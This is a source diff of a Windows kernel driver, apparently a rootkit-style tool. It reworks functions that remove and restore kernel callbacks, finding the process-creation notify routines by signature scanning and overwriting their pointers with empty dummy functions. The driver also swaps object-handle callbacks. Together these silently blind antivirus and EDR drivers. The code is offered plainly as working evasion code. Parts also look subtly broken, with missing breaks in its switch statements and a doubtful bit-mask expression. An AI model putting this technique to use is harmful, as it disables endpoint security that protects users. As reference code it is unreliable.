@@ -8,16 +8,18 @@ constexpr SIZE_T PspSetCreateProcessNotifyRoutineSignatureDistance = 0x20;
 constexpr SIZE_T PspCreateProcessNotifyRoutineDistance = 0xC3;
 constexpr SIZE_T PsNotifyRoutinesRoutineOffset = 5;
 constexpr SIZE_T RoutinesListOffset = 7;
-constexpr SIZE_T PsNotifyRoutinesRoutineCountOffsetEx = 0xB;
-constexpr SIZE_T PsNotifyRoutinesRoutineCountOffset = 0xF;
+constexpr SIZE_T PsNotifyRoutinesRoutineCountOffsetEx = 0x7;
+constexpr SIZE_T PsNotifyRoutinesRoutineCountOffset = 0xB;
 
 NTSTATUS RestoreCallback(KernelCallback* Callback);
 NTSTATUS RemoveCallback(KernelCallback* Callback);
 NTSTATUS ListObCallbacks(ObCallbacksList* Callbacks);
-NTSTATUS ListPsNotifyRoutines(PsRoutinesList* Callbacks);
+NTSTATUS ListPsNotifyRoutines(PsRoutinesList* Callbacks, ULONG64 ReplacerFunction, ULONG64 ReplacedFunction);
 NTSTATUS MatchCallback(PVOID callack, CHAR driverName[MAX_DRIVER_PATH]);
 OB_PREOP_CALLBACK_STATUS ObPreOpenDummyFunction(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info);
 VOID ObPostOpenDummyFunction(PVOID RegistrationContext, POB_POST_OPERATION_INFORMATION Info);
+void CreateProcessNotifyExDummyFunction(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo);
+void CreateProcessNotifyDummyFunction(HANDLE ParentId, HANDLE ProcessId, BOOLEAN Create);
 NTSTATUS AddDisabledCallback(DisabledKernelCallback Callback);
 NTSTATUS RemoveDisabledCallback(KernelCallback* Callback, DisabledKernelCallback* DisabledCallback);
 
@@ -32,52 +34,63 @@ NTSTATUS RemoveDisabledCallback(KernelCallback* Callback, DisabledKernelCallback
 * @status	[NTSTATUS]		  -- Whether successfuly removed or not.
 */
 NTSTATUS RestoreCallback(KernelCallback* Callback) {
-	DisabledKernelCallback callback;
+	DisabledKernelCallback callback{};
 	NTSTATUS status = STATUS_NOT_FOUND;
-	PFULL_OBJECT_TYPE objectType = NULL;
-
-	switch (Callback->Type) {
-	case ObProcessType:
-		objectType = (PFULL_OBJECT_TYPE)*PsProcessType;
-		break;
-	case ObThreadType:
-		objectType = (PFULL_OBJECT_TYPE)*PsThreadType;
-		break;
-	case PsCreateProcessType:
-		return PsSetCreateProcessNotifyRoutine((PCREATE_PROCESS_NOTIFY_ROUTINE)Callback->CallbackAddress, FALSE);
-	case PsCreateProcessTypeEx:
-		return PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)Callback->CallbackAddress, FALSE);
-	default:
-		status = STATUS_INVALID_PARAMETER;
-		break;
-	}
-
-	if (!NT_SUCCESS(status))
-		return status;
 
 	AutoLock locker(aaGlobals.Lock);
 	status = RemoveDisabledCallback(Callback, &callback);
 
-	ExAcquirePushLockExclusive((PULONG_PTR)&objectType->TypeLock);
-	POB_CALLBACK_ENTRY currentObjectCallback = (POB_CALLBACK_ENTRY)(&objectType->CallbackList);
+	if (!NT_SUCCESS(status))
+		return status;
 
-	do {
-		if (currentObjectCallback->Enabled && (ULONG64)currentObjectCallback->Entry == callback.Entry) {
-			if (currentObjectCallback->PreOperation == ObPreOpenDummyFunction) {
-				currentObjectCallback->PreOperation = (POB_PRE_OPERATION_CALLBACK)callback.CallbackAddress;
-				status = STATUS_SUCCESS;
-				break;
-			}
-			else if (currentObjectCallback->PostOperation == ObPostOpenDummyFunction) {
-				currentObjectCallback->PostOperation = (POB_POST_OPERATION_CALLBACK)callback.CallbackAddress;
-				status = STATUS_SUCCESS;
-				break;
-			}
+	if (Callback->Type == ObProcessType || Callback->Type == ObThreadType) {
+		PFULL_OBJECT_TYPE objectType = NULL;
+
+		switch (Callback->Type) {
+		case ObProcessType:
+			objectType = (PFULL_OBJECT_TYPE)*PsProcessType;
+			break;
+		case ObThreadType:
+			objectType = (PFULL_OBJECT_TYPE)*PsThreadType;
+			break;
 		}
-		currentObjectCallback = (POB_CALLBACK_ENTRY)currentObjectCallback->CallbackList.Flink;
-	} while ((PVOID)currentObjectCallback != (PVOID)(&objectType->CallbackList));
 
-	ExReleasePushLockExclusive((PULONG_PTR)&objectType->TypeLock);
+		ExAcquirePushLockExclusive((PULONG_PTR)&objectType->TypeLock);
+		POB_CALLBACK_ENTRY currentObjectCallback = (POB_CALLBACK_ENTRY)(&objectType->CallbackList);
+
+		do {
+			if (currentObjectCallback->Enabled && (ULONG64)currentObjectCallback->Entry == callback.Entry) {
+				if (currentObjectCallback->PreOperation == ObPreOpenDummyFunction) {
+					currentObjectCallback->PreOperation = (POB_PRE_OPERATION_CALLBACK)callback.CallbackAddress;
+					status = STATUS_SUCCESS;
+					break;
+				}
+				else if (currentObjectCallback->PostOperation == ObPostOpenDummyFunction) {
+					currentObjectCallback->PostOperation = (POB_POST_OPERATION_CALLBACK)callback.CallbackAddress;
+					status = STATUS_SUCCESS;
+					break;
+				}
+			}
+			currentObjectCallback = (POB_CALLBACK_ENTRY)currentObjectCallback->CallbackList.Flink;
+		} while ((PVOID)currentObjectCallback != (PVOID)(&objectType->CallbackList));
+
+		ExReleasePushLockExclusive((PULONG_PTR)&objectType->TypeLock);
+	}
+	else if (Callback->Type == PsCreateProcessType || Callback->Type == PsCreateProcessTypeEx) {
+		PsRoutinesList routines{};
+		ULONG64 replacedFunction = 0;
+		routines.Type = Callback->Type;
+
+		switch (Callback->Type) {
+		case PsCreateProcessType:
+			replacedFunction = (ULONG64)CreateProcessNotifyDummyFunction;
+		case PsCreateProcessTypeEx:
+			replacedFunction = (ULONG64)CreateProcessNotifyExDummyFunction;
+		}
+
+		status = ListPsNotifyRoutines(&routines, Callback->CallbackAddress, replacedFunction);
+	}
+	
 	return status;
 }
 
@@ -92,58 +105,70 @@ NTSTATUS RestoreCallback(KernelCallback* Callback) {
 * @status	[NTSTATUS]		  -- Whether successfuly removed or not.
 */
 NTSTATUS RemoveCallback(KernelCallback* Callback) {
+	DisabledKernelCallback callback{};
 	NTSTATUS status = STATUS_NOT_FOUND;
-	PFULL_OBJECT_TYPE objectType = NULL;
-	ULONG64 operationAddress = 0;
+	
+	if (Callback->Type == ObProcessType || Callback->Type == ObThreadType) {
+		PFULL_OBJECT_TYPE objectType = NULL;
+		ULONG64 operationAddress = 0;
 
-	switch (Callback->Type) {
-	case ObProcessType:
-		objectType = (PFULL_OBJECT_TYPE)*PsProcessType;
-		break;
-	case ObThreadType:
-		objectType = (PFULL_OBJECT_TYPE)*PsThreadType;
-		break;
-	case PsCreateProcessType:
-		return PsSetCreateProcessNotifyRoutine((PCREATE_PROCESS_NOTIFY_ROUTINE)Callback->CallbackAddress, TRUE);
-	case PsCreateProcessTypeEx:
-		return PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)Callback->CallbackAddress, TRUE);
-	default:
-		status = STATUS_INVALID_PARAMETER;
-		break;
+		switch (Callback->Type) {
+		case ObProcessType:
+			objectType = (PFULL_OBJECT_TYPE)*PsProcessType;
+			break;
+		case ObThreadType:
+			objectType = (PFULL_OBJECT_TYPE)*PsThreadType;
+			break;
+		}
+
+		ExAcquirePushLockExclusive((PULONG_PTR)&objectType->TypeLock);
+		POB_CALLBACK_ENTRY currentObjectCallback = (POB_CALLBACK_ENTRY)(&objectType->CallbackList);
+
+		do {
+			if (currentObjectCallback->Enabled) {
+				if ((ULONG64)currentObjectCallback->PreOperation == Callback->CallbackAddress) {
+					operationAddress = (ULONG64)currentObjectCallback->PreOperation;
+					currentObjectCallback->PreOperation = ObPreOpenDummyFunction;
+				}
+				else if ((ULONG64)currentObjectCallback->PostOperation == Callback->CallbackAddress) {
+					operationAddress = (ULONG64)currentObjectCallback->PostOperation;
+					currentObjectCallback->PostOperation = ObPostOpenDummyFunction;
+				}
+
+				if (operationAddress) {
+					callback.CallbackAddress = operationAddress;
+					callback.Entry = (ULONG64)currentObjectCallback->Entry;
+					callback.Type = Callback->Type;
+					break;
+				}
+			}
+			currentObjectCallback = (POB_CALLBACK_ENTRY)currentObjectCallback->CallbackList.Flink;
+		} while ((PVOID)currentObjectCallback != (PVOID)(&objectType->CallbackList));
+
+		ExReleasePushLockExclusive((PULONG_PTR)&objectType->TypeLock);
+	}
+	else if (Callback->Type == PsCreateProcessType || Callback->Type == PsCreateProcessTypeEx) {
+		PsRoutinesList routines{};
+		ULONG64 replacerFunction = 0;
+		routines.Type = Callback->Type;
+
+		switch (Callback->Type) {
+		case PsCreateProcessType:
+			replacerFunction = (ULONG64)CreateProcessNotifyDummyFunction;
+		case PsCreateProcessTypeEx:
+			replacerFunction = (ULONG64)CreateProcessNotifyExDummyFunction;
+		}
+
+		status = ListPsNotifyRoutines(&routines, replacerFunction, Callback->CallbackAddress);
+		callback.CallbackAddress = Callback->CallbackAddress;
+		callback.Type = Callback->Type;
 	}
 
-	if (status == STATUS_INVALID_PARAMETER)
-		return status;
-
-	ExAcquirePushLockExclusive((PULONG_PTR)&objectType->TypeLock);
-	POB_CALLBACK_ENTRY currentObjectCallback = (POB_CALLBACK_ENTRY)(&objectType->CallbackList);
-
-	do {
-		if (currentObjectCallback->Enabled) {
-			if ((ULONG64)currentObjectCallback->PreOperation == Callback->CallbackAddress) {
-				operationAddress = (ULONG64)currentObjectCallback->PreOperation;
-				currentObjectCallback->PreOperation = ObPreOpenDummyFunction;
-			}
-			else if ((ULONG64)currentObjectCallback->PostOperation == Callback->CallbackAddress) {
-				operationAddress = (ULONG64)currentObjectCallback->PostOperation;
-				currentObjectCallback->PostOperation = ObPostOpenDummyFunction;
-			}
-
-			if (operationAddress) {
-				DisabledKernelCallback callback;
-				callback.CallbackAddress = operationAddress;
-				callback.Entry = (ULONG64)currentObjectCallback->Entry;
-				callback.Type = Callback->Type;
-				AutoLock locker(aaGlobals.Lock);
-
-				status = AddDisabledCallback(callback);
-				break;
-			}
-		}
-		currentObjectCallback = (POB_CALLBACK_ENTRY)currentObjectCallback->CallbackList.Flink;
-	} while ((PVOID)currentObjectCallback != (PVOID)(&objectType->CallbackList));
-
-	ExReleasePushLockExclusive((PULONG_PTR)&objectType->TypeLock);
+	if (NT_SUCCESS(status)) {
+		AutoLock locker(aaGlobals.Lock);
+		status = AddDisabledCallback(callback);
+	}
+	
 	return status;
 }
 
@@ -152,12 +177,14 @@ NTSTATUS RemoveCallback(KernelCallback* Callback) {
 * ListPsNotifyRoutines is responsible to list all registered PsNotify routines.
 *
 * Parameters:
-* @Callbacks [CallbacksList*]	-- All callbacks as list.
+* @Callbacks	    [CallbacksList*] -- All callbacks as list.
+* @ReplacerFunction [ULONG64]		 -- If not null, the address of the function to replace.
+* @ReplacedFunction [ULONG64]		 -- If not null, the address of the function to be replaced.
 *
 * Returns:
-* @status	 [NTSTATUS]			-- Whether successfuly listed or not.
+* @status		    [NTSTATUS]		 -- Whether successfuly listed or not.
 */
-NTSTATUS ListPsNotifyRoutines(PsRoutinesList* Callbacks) {
+NTSTATUS ListPsNotifyRoutines(PsRoutinesList* Callbacks, ULONG64 ReplacerFunction, ULONG64 ReplacedFunction) {
 	NTSTATUS status = STATUS_SUCCESS;
 	PVOID searchedRoutineAddress = NULL;
 	UCHAR* targetFunctionSignature = NULL;
@@ -241,15 +268,27 @@ NTSTATUS ListPsNotifyRoutines(PsRoutinesList* Callbacks) {
 
 	if (Callbacks->Type == PsCreateProcessType)
 		countOffset = PsNotifyRoutinesRoutineCountOffset;
-	Callbacks->NumberOfRoutines = *(PLONG)((PUCHAR)searchedRoutineAddress + *(routinesLengthOffset) + foundIndex + countOffset);
+	// Callbacks->NumberOfRoutines = *(PLONG)((PUCHAR)searchedRoutineAddress + *(routinesLengthOffset) + foundIndex + countOffset);
+	ULONG routinesCount = *(PLONG)((PUCHAR)searchedRoutineAddress + *(routinesLengthOffset) + foundIndex + countOffset);
 
-	for (SIZE_T i = 0; i < Callbacks->NumberOfRoutines; i++) {
+	for (SIZE_T i = 0; i < routinesCount; i++) {
 		currentRoutine = *(PULONG64)(routinesList + (i * 8));
-		Callbacks->Routines[i].CallbackAddress = *(PULONG64)(currentRoutine &= ~(1ULL << 3) + 0x1);
+		currentRoutine &= ~(1ULL << 3) + 1;
 
-		if (NT_SUCCESS(MatchCallback((PVOID)Callbacks->Routines[i].CallbackAddress, driverName)))
-			strcpy_s(Callbacks->Routines[i].DriverName, driverName);
+		if (ReplacedFunction && ReplacerFunction) {
+			if (*(PULONG64)(currentRoutine) == ReplacedFunction)
+				*(PULONG64)(currentRoutine) = ReplacerFunction;
+		}
+		else {
+			Callbacks->Routines[i].CallbackAddress = *(PULONG64)(currentRoutine);
+
+			if (NT_SUCCESS(MatchCallback((PVOID)Callbacks->Routines[i].CallbackAddress, driverName)))
+				strcpy_s(Callbacks->Routines[i].DriverName, driverName);
+		}
 	}
+
+	if (!ReplacedFunction && !ReplacerFunction)
+		Callbacks->NumberOfRoutines = routinesCount;
 
 Cleanup:
 	if (listCountSignature)
@@ -465,5 +504,37 @@ OB_PREOP_CALLBACK_STATUS ObPreOpenDummyFunction(PVOID RegistrationContext, POB_P
 * There is no return value.
 */
 VOID ObPostOpenDummyFunction(PVOID RegistrationContext, POB_POST_OPERATION_INFORMATION Info) {
+	return;
+}
+
+/*
+* Description:
+* CreateProcessNotifyExDummyFunction is a dummy function for create process notify routine ex.
+*
+* Parameters:
+* @Process    [PEPROCESS]			   -- Unused.
+* @ProcessId  [HANDLE]			       -- Unused.
+* @CreateInfo [PPS_CREATE_NOTIFY_INFO] -- Unused.
+*
+* Returns:
+* There is no return value.
+*/
+void CreateProcessNotifyExDummyFunction(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo) {
+	return;
+}
+
+/*
+* Description:
+* CreateProcessNotifyDummyFunction is a dummy function for create process notify routine.
+*
+* Parameters:
+* @ParentId  [HANDLE]  -- Unused.
+* @ProcessId [HANDLE]  -- Unused.
+* @Create	 [BOOLEAN] -- Unused.
+*
+* Returns:
+* There is no return value.
+*/
+void CreateProcessNotifyDummyFunction(HANDLE ParentId, HANDLE ProcessId, BOOLEAN Create) {
 	return;
 }
